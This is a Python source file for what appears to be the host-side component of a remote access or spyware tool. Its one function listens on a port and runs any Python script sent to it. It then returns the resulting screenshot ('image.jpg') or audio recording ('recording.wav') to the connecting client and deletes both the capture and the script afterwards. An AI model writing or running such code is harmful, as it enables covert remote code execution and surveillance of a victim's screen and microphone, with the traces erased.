from termcolor import colored
import socket
import os,subprocess

def execonhost(ip,port,type='image'):

	sock = socket.socket()
	sock.bind(('0.0.0.0',port))

	sock.listen()
	scon, addr = sock.accept()

	if type == 'image':
		outputfile = 'image.jpg'
	elif type == 'audio':
		outputfile = 'recording.wav'

#	print ("Receving screenshot script...")

	file = open('script.py','wb')
	line = scon.recv(1024)

	while(line):
		if line.decode() != "EOF":
#			print (line.decode())
			file.write(line)
			line = scon.recv(1024)
		else:
			file.close()
			break

#	print ("File received! Executing python script")

	try:
		subprocess.run(['python3','script.py'])
	except:
		print (colored(f'\nFile does not exist\n','red'))
#	print ("File execution successful!")

	fileopen = True
	try:
		file = open(outputfile,'rb')
	except:
		print (colored(f'\nFile does not exist\n','red'))
		fileopen = False

	if fileopen == True:

		line = file.read(1024)

		while(line):
			scon.send(line)
			line = file.read(1024)

		file.close()

		print (colored(f'\nTransfered file to client!\n','green'))

		try:
			os.remove(outputfile)
		except:
			print (colored(f'\nFile does not exist\n','red'))
	else:
		scon.send(' '.encode())


	try:
		os.remove('script.py')
	except:
		print (colored(f'\nFile does not exist\n','red'))

	sock.close()

